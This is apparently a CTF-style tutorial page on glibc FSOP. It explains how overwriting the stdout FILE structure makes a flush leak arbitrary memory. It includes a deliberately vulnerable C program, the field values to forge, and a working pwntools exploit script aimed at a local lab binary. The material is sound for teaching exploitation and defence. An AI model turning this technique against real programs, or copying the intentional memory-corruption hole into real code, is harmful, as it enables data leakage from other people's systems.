#metadata(
  (
    title: "Arbitrary Read via stdout",
    description: "Leaking data by corrupting the stdout FILE structure directly.",
    date: "2026-01-02",
    order: 5,
    draft: false,
  ),
)<frontmatter>
#import "../../../../typst-theme.c.typ": project
#show: project

== Prerequisites
- *Memory Corruption*: Ability to overwrite the `stdout` `FILE` structure (often in the `libc` BSS or via a pointer).
- *Known Address*: Knowledge of the address of the data you want to leak.
- *Library Leaks*: Knowledge of the base address of `libc` to locate `stdout` (if not statically linked or already available).

= Arbitrary Read via `stdout` Corruption

Reading (leaking) data using `puts` and `fwrite` relies on the exact same underlying FSOP payload and mechanism. Both functions eventually trigger the internal `_IO_file_overflow` or `_IO_do_write` functions to flush the `FILE` structure's "write buffer" to the file descriptor.

By manipulating these pointers, you are lying to the program, claiming that the `FILE` structure already contains data in its internal buffer that is waiting to be written out.

Crucially, this can work *even without* an explicit call to `puts` or `printf`. When a C program terminates normally (e.g., via `return 0;`), it calls `exit(0)`. This function iterates through all active file streams (via `_IO_list_all`) and flushes their buffers. Since our payload marks the buffer as "full" of pending data, the cleanup routine will write it to stdout.

== Vulnerable Scenario

In this scenario, we directly overwrite the `stdout` pointer or the structure it points to. Note that there is no output function called after the `read`; the leak is triggered by the program's termination.

```c
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

FILE *fp;
char *buf;
char secret[0x100];

int main(int argc, char **argv, char **envp) {
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 0);

  printf("The secret is located at %p\n", secret);
  strcpy(secret, "Well done baby");

  buf = malloc(0x100);

  // In this example, we overwrite the FILE struct pointed to by fp (which is stdout)
  fp = stdout;

  read(0, fp, 0x1e0);

  // No explicit print needed; exit(0) will flush stdout.
  return 0;
}
```

== Triggers

While `exit(0)` is a common trigger during CTFs, the flush (and thus the leak) occurs whenever Glibc decides it needs to write the buffer's contents. This happens when:

1. *Program Termination*: `exit()` or returning from `main` (iterates `_IO_list_all` and flushes).
2. *Explicit Output*: Any function that writes to `stdout` (e.g., `puts`, `printf`, `fwrite`, `fputs`, `fprintf`, `putchar`, `fputc`).
3. *Explicit Flush*: `fflush(stdout)` or `fflush(NULL)`.
4. *Tied Streams*: Input functions on `stdin` (like `scanf` or `gets`) will flush `stdout` if the streams are tied (common in interactive apps).
5. *Line Buffering*: Printing a `\n` if the `_IO_LINE_BUF` flag (`0x200`) is set.
6. *Abort*: `abort()` often calls `_IO_flush_all_lockp` during cleanup.

== Exploitation Strategy

To perform this Arbitrary Read (Leak), you construct the `FILE` structure as follows:

1. *`_flags`*: Set `_IO_CURRENTLY_PUTTING` (`0x800`) and ensure `_IO_NO_WRITES` (`0x8`) is *not* set. A common magic value is `0xFBAD0800`.
2. *`_fileno`*: Set to `1` (stdout) so the leaked data is printed to your terminal.
3. *`_IO_write_base`*: Set to the start address of the data you want to leak (e.g., the address of `secret`).
4. *`_IO_write_ptr`*: Set to the end address of the data (`start + length`).
5. *`_IO_read_end`*: Set equal to `_IO_write_base` to pass internal checks (specifically in `new_do_write`).

== Exploit Script

```python
from pwn import *

elf = context.binary = ELF("./a.out")
context.terminal = ["tmux", "splitw", "-h"]

p = process(elf.path)

p.recvuntil(b"The secret is located at ")
secret_addr = int(p.recvline().strip(), 16)
log.info(f"Secret address: {hex(secret_addr)}")

# Crafting the fake FILE structure for stdout
payload = flat(
    {
        0x00: 0xFBAD0000 | 0x800,  # _flags: Magic + CURRENTLY_PUTTING
        0x10: secret_addr,         # _IO_read_end
        0x20: secret_addr,         # _IO_write_base (start of leak)
        0x28: secret_addr + 0x100, # _IO_write_ptr (end of leak)
    },
)

p.send(payload)

# The program calls exit(0), which flushes stdout and sends us the leak
print(p.recvall(timeout=1))
p.close()
```
